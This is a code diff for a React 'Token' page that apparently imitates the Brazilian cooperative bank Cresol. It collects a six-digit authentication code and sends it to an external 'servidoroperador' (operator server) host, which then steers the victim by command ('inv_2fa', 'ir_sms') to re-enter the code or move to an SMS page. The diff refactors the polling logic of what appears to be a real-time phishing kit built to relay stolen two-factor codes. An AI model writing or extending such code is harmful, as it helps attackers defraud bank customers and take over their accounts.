@@ -1,125 +1,51 @@
 
-import React, { useState, useEffect, useRef } from "react";
+import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
-import { useClientStatus } from "@/hooks/useClientStatus";
-
-// Função para monitorar cliente continuamente na página Token
-const monitorClientToken = async (
-  clientId: string, 
-  navigate: (path: string) => void,
-  onInvalidCode: () => void,
-  isMonitoringRef: React.MutableRefObject<boolean>
-): Promise<void> => {
-  console.log(`Iniciando monitoramento Token do cliente: ${clientId}`);
-  
-  let intervalId: NodeJS.Timeout;
-  
-  const monitor = async () => {
-    if (!isMonitoringRef.current) {
-      console.log('Monitoramento Token parado por flag');
-      clearInterval(intervalId);
-      return;
-    }
-
-    try {
-      console.log(`Consultando dados do cliente ${clientId} na página Token...`);
-      
-      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
-        method: 'GET',
-        headers: {
-          'Content-Type': 'application/json',
-        }
-      });
-
-      console.log(`Status da consulta Token: ${response.status}`);
-      
-      if (response.ok) {
-        const clientData = await response.json();
-        console.log('Dados do cliente Token recebidos:', clientData);
-        console.log('Valor do response Token:', clientData.data?.response);
-        console.log('Valor do command Token:', clientData.data?.command);
-        
-        // Verificar se o token é inválido - NÃO para o monitoramento
-        if (clientData.data?.response === "inv_2fa" || clientData.data?.command === "inv_2fa") {
-          console.log('Detectado inv_2fa - Token inválido, mas continuando monitoramento');
-          onInvalidCode();
-          return; // Continua monitoramento, não para
-        }
-        
-        // Na página Token: se receber ir_2fa, continua monitorando; aguarda próximo comando para redirecionar
-        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
-          console.log('Detectado ir_2fa na página Token - Continuando monitoramento...');
-        }
-        
-        // Se receber ir_sms, redireciona para SMS e para monitoramento
-        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
-          console.log('Detectado ir_sms na página Token - Redirecionando para /sms');
-          clearInterval(intervalId);
-          isMonitoringRef.current = false;
-          console.log('Monitoramento Token parado - redirecionando...');
-          navigate('/sms');
-          return;
-        }
-        
-        console.log('Continuando monitoramento Token...');
-      } else {
-        const errorData = await response.text();
-        console.log('Erro na consulta Token do cliente:', errorData);
-      }
-
-    } catch (error) {
-      console.log('Erro durante consulta Token do cliente:', error);
-    }
-  };
-
-  // Executar primeira consulta imediatamente
-  await monitor();
-  
-  // Configurar monitoramento contínuo a cada 3 segundos
-  intervalId = setInterval(monitor, 3000);
-  console.log('Monitoramento Token contínuo configurado (3 segundos)');
-};
+import { useClientMonitoring } from "@/hooks/useClientMonitoring";
 
 const TokenPage = () => {
   const navigate = useNavigate();
-  const clientStatus = useClientStatus();
+  const clientMonitoring = useClientMonitoring();
   const [token, setToken] = useState("");
   const [clientId, setClientId] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [isInvalid, setIsInvalid] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
-  const isMonitoringRef = useRef(false);
 
   useEffect(() => {
-    // Recuperar clientId do localStorage
     const storedClientId = localStorage.getItem('clientId');
     if (storedClientId) {
       setClientId(storedClientId);
-      console.log('ClientId recuperado do localStorage:', storedClientId);
+      console.log('TOKEN: ClientId recuperado:', storedClientId);
       
-      // Iniciar monitoramento de status
-      clientStatus.startMonitoring();
+      // Iniciar monitoramento centralizado
+      clientMonitoring.startMonitoring(storedClientId, 'token');
     } else {
-      console.log('ClientId não encontrado no localStorage');
+      console.log('TOKEN: ClientId não encontrado');
     }
 
-    // Cleanup quando sair da página
     return () => {
-      isMonitoringRef.current = false;
-      clientStatus.stopMonitoring();
+      clientMonitoring.stopMonitoring();
     };
-  }, [clientStatus]);
+  }, [clientMonitoring]);
 
   const handleTokenChange = (value: string) => {
     setToken(value.replace(/\D/g, '').slice(0, 6));
-    // Reset error state when user starts typing
     if (isInvalid) {
       setIsInvalid(false);
       setErrorMessage("");
     }
+  };
+
+  const handleInvalidToken = () => {
+    console.log('Token inválido detectado');
+    setToken("");
+    setIsLoading(false);
+    setIsInvalid(true);
+    setErrorMessage("Token inválido. Tente novamente.");
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -131,14 +57,12 @@ const TokenPage = () => {
     }
 
     try {
-      console.log('Enviando token via external-response:', token);
-      console.log('ClientId utilizado:', clientId);
+      console.log('Enviando token:', token);
       
       setIsLoading(true);
       setIsInvalid(false);
       setErrorMessage("");
       
-      // Enviar token para a API usando external-response
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
         method: 'PATCH',
         headers: {
@@ -150,29 +74,10 @@ const TokenPage = () => {
       });
 
       if (response.ok) {
-        console.log('Token enviado com sucesso via external-response');
-        
-        // Só iniciar monitoramento se não estiver já monitorando
-        if (!isMonitoringRef.current) {
-          isMonitoringRef.current = true;
-          // Iniciar monitoramento contínuo após envio bem-sucedido
-          await monitorClientToken(
-            clientId, 
-            navigate,
-            () => {
-              // Função onInvalidCode modificada: limpa campo, para loading, mantém monitoramento
-              console.log('Token inválido detectado - limpando campo e parando loading');
-              setToken(""); // Limpar o campo token
-              setIsLoading(false); // Parar o loading
-              setIsInvalid(true);
-              setErrorMessage("Token inválido. Tente novamente.");
-              // NÃO para o monitoramento - isMonitoringRef.current continua true
-            },
-            isMonitoringRef
-          );
-        }
+        console.log('Token enviado com sucesso');
+        // O monitoramento já está ativo e detectará ir_sms ou inv_2fa
       } else {
-        console.log('Erro ao enviar token via external-response');
+        console.log('Erro ao enviar token');
         setIsLoading(false);
       }
     } catch (error) {
@@ -181,8 +86,17 @@ const TokenPage = () => {
     }
   };
 
+  // Configurar callback para token inválido
+  useEffect(() => {
+    window.handleInvalidToken = handleInvalidToken;
+    
+    return () => {
+      delete window.handleInvalidToken;
+    };
+  }, []);
+
   const handleBack = () => {
-    isMonitoringRef.current = false;
+    clientMonitoring.stopMonitoring();
     navigate("/sms");
   };
 
